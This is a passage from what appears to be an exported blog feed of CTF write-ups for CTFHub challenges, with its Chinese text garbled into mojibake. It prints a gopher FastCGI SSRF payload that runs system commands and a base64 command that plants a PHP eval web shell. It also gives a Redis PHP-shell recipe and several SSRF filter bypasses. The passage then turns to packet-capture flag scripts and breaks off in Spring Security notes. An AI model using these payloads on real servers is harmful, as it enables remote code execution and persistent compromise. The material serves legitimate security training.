class="line">gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure></p><ul><li><p>ä½¿ç”¨bpçš„repeaterå‘é€åè·å–</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NX-Powered-By: PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">-----Made-by-SpyD3r-----</span><br><span class="line">htm</span><br></pre></td></tr></table></figure></li><li><p>ç„¶åé‡å¤ä¸Šè¿°æ“ä½œï¼Œè¾“å…¥å¹¶è¿›è¡Œurlç¼–ç å³å¯è·å–flag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">ls /flag</span><br></pre></td></tr></table></figure></li><li><p>ä¹Ÿå¯ä»¥å†™ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> JTNDJTNGcGhwJTIwZXZhbCUyOCUyNF9QT1NUJTVCc2hlbGwlNUQlMjklM0IlM0YlM0UlMDA= | base64 -d &gt; /var/www/html/shel1.php</span><br></pre></td></tr></table></figure></li></ul><p>å…¶ä¸­*&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php<em>å¯ä»¥ç”¨</em>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php*ä»£æ›¿ï¼Œå°±æ˜¯æœåŠ¡å™¨é‡Œé¢æœ‰çš„phpæ–‡ä»¶å³å¯ï¼Œpearæ˜¯è‡ªå¸¦çš„ã€‚</p><p><a href="https://www.modb.pro/db/163739">åŸç†å‚è€ƒ</a></p><h4><span id="redisåè®®">Redisåè®®</span></h4><ul><li><p>é€šè¿‡gopherusä¸€æŠŠæ¢­</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis</span><br><span class="line">PHPShell</span><br><span class="line">&lt;?php eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>å†è¿›è¡Œä¸€æ¬¡urlç¼–ç å³å¯</p></li></ul><h4><span id="url-bypass">URL Bypass</span></h4><p>è¿™ä¸ªé¢˜çš„è€ƒç‚¹ä¸DNSè§£ææœ‰å…³ï¼Œåƒæˆ‘ä»¬å¹³æ—¶è¾“å…¥çš„ç™¾åº¦ç½‘å€<a href="http://www.baidu.comä¸­çš„wwwæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹åŸŸåè§£æå‰ç¼€çš„ä½œç”¨">www.baidu.comä¸­çš„wwwæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹åŸŸåè§£æå‰ç¼€çš„ä½œç”¨</a></p><p>wwwï¼šäºŒçº§åŸŸåè§£æï¼Œä»¥ç™¾åº¦ä¸ºä¾‹ï¼Œå°±æ˜¯<a href="http://www.baidu.com/">www.baidu.com</a></p><p>@ ï¼šä¸»åŸŸåè§£æï¼Œå³@ç¬¦å·åé¢ç›´æ¥è·ŸåŸŸåï¼Œå¦‚æœå‰é¢æœ‰ä¸œè¥¿ï¼Œä¼šè¢«å¿½ç•¥ã€‚</p><p>*ï¼šæ˜¯æŒ‡æ³›è§£æï¼Œæ˜¯æŒ‡é™¤å·²æ·»åŠ çš„è§£æè®°å½•ä»¥å¤–çš„æ‰€æœ‰ä¸»æœºéƒ½ä»¥æ­¤ä¸ºå‡†ï¼Œä»¥ç™¾åº¦ä¸ºä¾‹ï¼Œå°±æ˜¯ 12343.baidu.comã€‚</p><ul><li><p>è¿™é“é¢˜ç›´æ¥ä½¿ç”¨@è·³è¿‡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://notfound.ctfhub.com@127.0.0.1:80/flag.php</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://blog.csdn.net/xhy18634297976/article/details/120895812">å…¶ä»–æ–¹æ³•</a></p><h4><span id="æ•°å­—ip-bypass">æ•°å­—IP Bypass</span></h4><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IPåœ°å€è½¬æ¢</a></p><ul><li><p>æ–¹æ³•ä¸€ï¼šé€šè¿‡IPåœ°å€è½¬æ¢ï¼Œå°†10è¿›åˆ¶çš„æ•°ä»£æ›¿127.0.0.1å³å¯ï¼Œæˆ–è€…16è¿›åˆ¶å‰é¢åŠ ä¸ª0x</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=2130706433:80/flag.php</span><br><span class="line"></span><br><span class="line">http://challenge-b558d4473913b437.sandbox.ctfhub.com:10800/?url=0x7F000001:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨localhost</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=localhost:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸‰ï¼›ç‰¹æ®Šåœ°å€<a href="http://0.0.0.0/">http://0/</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=0/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="302è·³è½¬">302è·³è½¬</span></h4><ul><li>å¸¸è§„è§£æ³•å‚è€ƒä¸Šé¢˜èƒ½åšã€‚</li><li>ä½¿ç”¨<a href="https://www.bejson.com/convert/shorturl/">çŸ­åœ°å€è½¬æ¢</a> <code>http://127.0.0.1/flag.php</code>å³å¯</li></ul><h4><span id="dnsé‡ç»‘å®š-bypass">DNSé‡ç»‘å®š Bypass</span></h4><ul><li><p><strong>åŒæºç­–ç•¥</strong>ï¼šä¸¤ä¸ªURLä½¿ç”¨ç›¸åŒçš„<font color="red"><em><strong>åè®®ã€åŸŸåã€ç«¯å£</strong></em> </font>ï¼ˆIEæµè§ˆå™¨æ²¡æœ‰ç«¯å£ï¼‰ä¸‰è€…ç›¸åŒåˆ™ç§°ä¸ºåŒæºã€‚ç®€å•æ¥è¯´åŒæºå°±æ˜¯ä¸ºäº†ä½¿ä¸€ä¸ªåŸŸåä¸‹çš„ç½‘ç«™åªèƒ½è°ƒç”¨æœ¬åŸŸåä¸‹çš„èµ„æºï¼Œé˜²æ­¢å…¶å®ƒåŸŸåçš„è®¿é—®é€ æˆä¸€äº›å±å®³ã€‚</p></li><li><p>DNSé‡ç»‘å®šï¼šåœ¨ç½‘é¡µæµè§ˆè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·åœ¨åœ°å€æ ä¸­è¾“å…¥åŒ…å«åŸŸåçš„ç½‘å€ã€‚æµè§ˆå™¨é€šè¿‡DNSæœåŠ¡å™¨å°†åŸŸåè§£æä¸ºIPåœ°å€ï¼Œç„¶åå‘å¯¹åº”çš„IPåœ°å€è¯·æ±‚èµ„æºï¼Œæœ€åå±•ç°ç»™ç”¨æˆ·ã€‚è€Œå¯¹äºåŸŸåæ‰€æœ‰è€…ï¼Œä»–å¯ä»¥è®¾ç½®åŸŸåæ‰€å¯¹åº”çš„IPåœ°å€ã€‚å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåè·å–ä¸€ä¸ªIPåœ°å€ï¼›ç„¶åï¼ŒåŸŸåæŒæœ‰è€…ä¿®æ”¹å¯¹åº”çš„IPåœ°å€ï¼›ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥åŸŸåï¼Œå°±ä¼šè·å–ä¸€ä¸ªæ–°çš„IPåœ°å€ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚ï¼ˆæµè§ˆå™¨åŒæºç­–ç•¥ï¼‰ è¿™å°±æ˜¯DNS Rebindingæ”»å‡»ã€‚</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/89426041">å‚è€ƒ</a></p></li><li><p><a href="https://lock.cmpxchg8b.com/rebinder.html">é‡ç»‘å®šå·¥å…·åœ°å€</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-008000c7973432be.sandbox.ctfhub.com:10800/?url=7f000001.c0a80001.rbndr.us/flag.php</span><br></pre></td></tr></table></figure></li></ul><h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1><h3><span id="æµé‡åˆ†æ">æµé‡åˆ†æ</span></h3><ul><li>ä½¿ç”¨åˆ°å·¥å…·æ˜¯<strong>WireShark</strong></li></ul><h4><span id="mysqlæµé‡">Mysqlæµé‡</span></h4><ul><li>ç›´æ¥ä¸‹è½½åŒ…ï¼Œç„¶ååœ¨filteré‡Œé¢è¾“å…¥mysqlï¼Œç„¶åçœ‹infoé‡Œé¢ç™»å½•æˆåŠŸçš„é‚£æ¡</li><li>ä½¿ç”¨<strong>follow tcp stream</strong> ç„¶ååœ¨<strong>find</strong>é‡Œé¢è¾“å…¥å…³é”®å­—<code>ctf</code>å³å¯ã€‚</li></ul><h4><span id="redisæµé‡">Redisæµé‡</span></h4><ul><li><p>ä½¿ç”¨<strong>follow tcp stream</strong> ç„¶ååœ¨<strong>find</strong>é‡Œé¢è¾“å…¥å…³é”®å­—<code>ctf</code>å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Fl4g1</span><br><span class="line">$22</span><br><span class="line">ctfhub&#123;6051d6123de43df</span><br><span class="line">+OK</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">flag2</span><br><span class="line">$18</span><br><span class="line">ad7609804925c0121&#125;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥å‡º<code>ctfhub&#123;6051d6123de43dfad7609804925c0121&#125;</code></p></li></ul><h4><span id="mongodb">MongoDB</span></h4><ul><li>ä¹Ÿæ˜¯ç›´æ¥è·Ÿè¸ªæµï¼Œç„¶åæ—è¾¹æœ‰ä¸ªé€‰é¡¹å¯ä»¥ç›´æ¥é€‰æ‹©ç¬¬å‡ ä¸ªæµï¼Œæˆ‘ä»¬ç›´æ¥æœå…³é”®è¯<code>ctfhub&#123;</code>æ‰¾ä¸åˆ°å°±æ¢ä¸‹ä¸ªæµï¼ŒèŠ‚çœå¾ˆå¤šæ—¶é—´ã€‚</li></ul><h4><span id="icmp-data">ICMP Data</span></h4><ul><li><p>æ–¹æ³•ä¸€ï¼šæ— æ³•è·Ÿè¸ªæµï¼Œç”¨â†“é€ä¸ªè§‚å¯Ÿï¼Œå‘ç°æœ‰ä¸ªä½ç½®æ¯æ¬¡å’Œä¸Šæ¬¡ä¸ä¸€æ ·ï¼Œæ‹¼èµ·æ¥å°±æ˜¯flagï¼Œæ¯æ¬¡éƒ½æœ‰ä¸¤ä¸ªåŒ…æ˜¯ä¸€æ ·çš„ä¸€ä¸ª<em>request</em>ä¸€ä¸ª<em>response</em>ï¼Œå› æ­¤ç­”æ¡ˆå°±æ˜¯<code>ctfhub&#123;c87eb99796406ac0b&#125;</code></p></li><li><p>æ–¹æ³•äºŒï¼šç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --authorï¼švalecalida--</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> get_hex</span><br><span class="line"><span class="comment"># è°ƒç”¨tsharkæ—¶éœ€è¦å°†tsharkåŠ å…¥ç¯å¢ƒå˜é‡ï¼Œä¸”è„šæœ¬éœ€è¦ä¸æµé‡åŒ…åœ¨ä¸€ä¸ªè·¯å¾„ä¸‹</span></span><br><span class="line"> </span><br><span class="line">get_hex(<span class="string">&quot;tshark -r icmp_data.pcap -Y \&quot;icmp &amp;&amp; icmp.type==8\&quot; -T fields -e data &gt; flag.txt&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(line[<span class="number">16</span>:<span class="number">18</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨pysharkï¼Œå…¶ä¸­<strong>type&#x3D;8å³è¯·æ±‚ï¼Œtype&#x3D;0å³å“åº”</strong>ï¼Œè¿™é‡Œ0æˆ–è€…8éƒ½å¯ä»¥ï¼Œå› ä¸ºæ˜¯é‡å¤çš„ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&quot;icmp_data.pcap&quot;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(cap[i].icmp.data_data)[<span class="number">24</span>:<span class="number">26</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul><p><strong>æ³¨æ„</strong>ï¼šåœ¨jupyteré‡Œé¢ä½¿ç”¨ä»£ç ä¼šå¯¼è‡´æŠ¥é”™<code>This event loop is already running</code>ã€‚</p><p><em>è§£å†³æ–¹æ¡ˆï¼š</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nest_asyncio</span><br><span class="line">nest_asyncio.apply()</span><br></pre></td></tr></table></figure><h4><span id="icmp-length">ICMP Length</span></h4><ul><li><p>é¢˜ç›®æç¤ºï¼Œflagæš—è—ç„åªå› ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len.pcap&#x27;</span>,display_filter=<span class="string">&#x27;icmp &amp;&amp; icmp.type==8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>):</span><br><span class="line">    pkt = cap[i]</span><br><span class="line">    flag+=(<span class="built_in">chr</span>(<span class="built_in">int</span>(pkt.icmp.data_len)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="icmp-lengthbin">ICMP LengthBin</span></h4><ul><li><p>é¢˜ç›®å¾ˆç›´æ¥çš„ç»™äº†æç¤ºï¼Œå°±æ˜¯äºŒè¿›åˆ¶ä¸lengthçš„å…³ç³»ï¼Œä½¿ç”¨wiresharkæ‰“å¼€æµé‡åŒ…æŸ¥çœ‹ï¼Œä½¿ç”¨è¿‡æ»¤å™¨icmp&amp;&amp; icmp.type&#x3D;&#x3D;8æ¥è¿›è¡Œè¿‡æ»¤ï¼ŒæŸ¥çœ‹æ¯ä¸€æ¡æµé‡çš„lengthå€¼ï¼Œå‘ç°éƒ½æ˜¯32æˆ–64ï¼Œç›´æ¥ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len_binary.pcap&#x27;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">cap.load_packets()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">con1 = <span class="string">&quot;&quot;</span></span><br><span class="line">con2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cap)):</span><br><span class="line">    <span class="keyword">if</span> cap[i].icmp.data_len == <span class="string">&#x27;32&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> cap[i].icmp.data_len == <span class="string">&#x27;64&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con1, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con2, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Security</title>
      <link href="/2022/12/23/Spring%20Security/"/>
      <url>/2022/12/23/Spring%20Security/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%9F%BA%E4%BA%8Ecookie%E4%B8%8Esession%E7%9A%84%E6%96%B9%E6%A1%88">åŸºäºCookieä¸Sessionçš„æ–¹æ¡ˆ</a></li><li><a href="#%E5%9F%BA%E4%BA%8Ejwt%E7%9A%84%E6%96%B9%E6%A1%88">åŸºäºjwtçš„æ–¹æ¡ˆ</a></li><li><a href="#%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89tokenredis">åŸºäºè‡ªå®šä¹‰Token+Redis</a></li><li><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF">æŠ€æœ¯è·¯çº¿</a></li></ul><ul><li><a href="#%E9%89%B4%E6%9D%83">é‰´æƒ</a><ul><li><a href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90">ç”¨æˆ·æƒé™</a></li><li><a href="#%E9%89%B4%E6%9D%83%E8%A7%84%E5%88%99%E6%BA%90">é‰´æƒè§„åˆ™æº</a></li><li><a href="#%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86">æˆæƒç®¡ç†</a></li><li><a href="#%E6%8E%88%E6%9D%83%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%99%A8">æˆæƒé”™è¯¯å¤„ç†å™¨</a></li><li><a href="#%E9%85%8D%E7%BD%AE%E6%8E%88%E6%9D%83%E8%BF%87%E6%BB%A4%E5%99%A8">é…ç½®æˆæƒè¿‡æ»¤å™¨</a></li><li><a href="#%E9%85%8D%E7%BD%AEspring-security">é…ç½®Spring Security</a></li></ul></li></ul><!-- tocstop --><p><a href="https://tianjiashu.github.io/category/Spring/">è®¤è¯éƒ¨åˆ†å¯ä»¥çœ‹å…·ä½“ç¬”è®°</a></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e97557e4960243a3942059939cdacacb~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp" alt="Spring Securityè¿‡æ»¤é“¾"></p><p><strong>å›¾ä¸­åªå±•ç¤ºäº†æ ¸å¿ƒè¿‡æ»¤å™¨</strong>ï¼Œå…¶å®ƒçš„éæ ¸å¿ƒè¿‡æ»¤å™¨å¹¶æ²¡æœ‰åœ¨å›¾ä¸­å±•ç¤ºã€‚</p><ul><li><code>UsernamePasswordAuthenticationFilter</code>:è´Ÿè´£å¤„ç†æˆ‘ä»¬åœ¨ç™»é™†é¡µé¢å¡«å†™äº†ç”¨æˆ·åå¯†ç åçš„ç™»é™†è¯·æ±‚ã€‚å…¥é—¨æ¡ˆä¾‹çš„è®¤è¯å·¥ä½œä¸»è¦æœ‰å®ƒè´Ÿè´£ã€‚ã€åˆ¤æ–­ä½ çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®ã€‘</li><li><code>ExceptionTranslationFilter</code>ï¼šå¤„ç†è¿‡æ»¤å™¨é“¾ä¸­æŠ›å‡ºçš„ä»»ä½•<code>AccessDeniedException</code>å’Œ<code>AuthenticationException</code> ã€‚ã€å¤„ç†è®¤è¯æˆæƒè¿‡ç¨‹ä¸­çš„æ‰€æœ‰å¼‚å¸¸ï¼Œæ–¹ä¾¿ç»Ÿä¸€å¤„ç†ã€‘</li><li><code>FilterSecurityInterceptor</code>ï¼šè´Ÿè´£æƒé™æ ¡éªŒçš„è¿‡æ»¤å™¨ã€‚ã€å®ƒä¼šåˆ¤æ–­ä½ ç™»å½•æˆåŠŸçš„ç”¨æˆ·æ˜¯â€œè°â€ï¼Œâ€œä½ â€å…·æœ‰ä»€ä¹ˆæƒé™ï¼Œå½“å‰è®¿é—®çš„èµ„æºéœ€è¦ä»€ä¹ˆæƒé™ã€‘</li></ul><p>è¿‡ç¨‹è¯¦è§£ï¼š</p><p>å½“å‰ç«¯æäº¤ç”¨æˆ·åå’Œå¯†ç è¿‡æ¥æ—¶ï¼Œè¿›å…¥äº†<code>UsernamePasswordAuthenticationFilter</code>è¿‡æ»¤å™¨ã€‚</p><ul><li><p>åœ¨<code>UsernamePasswordAuthenticationFilter</code>è¿‡æ»¤å™¨é‡Œï¼Œå°†ä¼ è¿›æ¥çš„ç”¨æˆ·åå’Œå¯†ç è¢«å°è£…æˆäº†**<code>Authentication</code><strong>å¯¹è±¡ã€è¿™æ—¶å€™æœ€å¤šåªæœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œæƒé™è¿˜æ²¡æœ‰ã€‘ï¼Œ</strong><code>Authentication</code><strong>å¯¹è±¡é€šè¿‡</strong><code>ProviderManager</code>çš„<code>authenticate</code>æ–¹æ³•**è¿›è¡Œè®¤è¯ã€‚</p><ul><li><p>åœ¨**<code>ProviderManager</code>**é‡Œé¢ï¼Œé€šè¿‡è°ƒç”¨<code>DaoAuthenticationProvider</code>çš„<code>authenticate</code>æ–¹æ³•è¿›è¡Œè®¤è¯ã€‚</p><ul><li><p>åœ¨<code>DaoAuthenticationProvider</code>é‡Œï¼Œè°ƒç”¨**<code>InMemoryUserDetailsManager</code>çš„<code>loadUserByUsername</code>æ–¹æ³•<strong>æŸ¥è¯¢ç”¨æˆ·ã€‚ã€ä¼ å…¥çš„å‚æ•°åªæœ‰</strong>ç”¨æˆ·åå­—ç¬¦ä¸²**ã€‘</p><ul><li><p>åœ¨</p><p><strong><code>InMemoryUserDetailsManager</code>çš„<code>loadUserByUsername</code>æ–¹æ³•</strong></p><p>é‡Œæ‰§è¡Œäº†ä»¥ä¸‹æ“ä½œ</p><ol><li>æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢å¯¹äºç”¨æˆ·ä»¥åŠè¿™ä¸ªç”¨æˆ·çš„æƒé™ä¿¡æ¯ã€<strong>åœ¨å†…å­˜é‡ŒæŸ¥</strong>ã€‘</li><li>æŠŠå¯¹åº”çš„ç”¨æˆ·ä¿¡æ¯åŒ…æ‹¬æƒé™ä¿¡æ¯å°è£…æˆ**<code>UserDetails</code>å¯¹è±¡**ã€‚</li><li>è¿”å›**<code>UserDetails</code>å¯¹è±¡**ã€‚</li></ol></li></ul></li><li><p>è¿”å›ç»™äº†<code>DaoAuthenticationProvider</code>ï¼Œåœ¨è¿™ä¸ªå¯¹è±¡é‡Œæ‰§è¡Œäº†ä»¥ä¸‹æ“ä½œ</p><ol><li>é€šè¿‡**<code>PasswordEncoder</code><strong>å¯¹æ¯”</strong><code>UserDetails</code><strong>ä¸­çš„å¯†ç å’Œ</strong><code>Authentication</code><strong>å¯†ç æ˜¯å¦æ­£ç¡®ã€‚ã€</strong>æ ¡éªŒå¯†ç ï¼ˆç»è¿‡åŠ å¯†çš„ï¼‰**ã€‘</li><li>å¦‚æœæ­£ç¡®å°±æŠŠ**<code>UserDetails</code><strong>çš„</strong>æƒé™ä¿¡æ¯<strong>è®¾ç½®åˆ°</strong><code>Authentication</code>**å¯¹è±¡ä¸­ã€‚</li><li>è¿”å›**<code>Authentication</code>**å¯¹è±¡ã€‚</li></ol></li></ul></li></ul></li><li><p>åˆå›åˆ°äº†è¿‡æ»¤å™¨é‡Œé¢<code>UsernamePasswordAuthenticationFilter</code>ã€‚</p><ol><li><p>å¦‚æœä¸Šä¸€æ­¥è¿”å›äº†**<code>Authentication</code>**å¯¹è±¡</p><p>å°±ä½¿ç”¨**<code>SecurityContextHolder.getContext().setAuthentication()</code>**æ–¹æ³•å­˜å‚¨å¯¹è±¡ã€‚</p><p><strong>å…¶ä»–è¿‡æ»¤å™¨</strong>ä¼šé€šè¿‡<code>SecurityContextHolder</code>æ¥è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯ã€‚ã€å½“å‰è¿‡æ»¤å™¨è®¤è¯å®Œäº†ï¼Œåé¢çš„è¿‡æ»¤å™¨è¿˜éœ€è¦è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œæ¯”å¦‚æˆæƒè¿‡æ»¤å™¨ã€‘</p></li></ol></li></ul><blockquote><p>å½©è‰²å­—ä½“çš„ç±»å‡æ˜¯æ¯”è¾ƒé‡è¦çš„<strong>æ¥å£</strong>ï¼Œåœ¨å®ç°è®¤è¯çš„è¿‡ç¨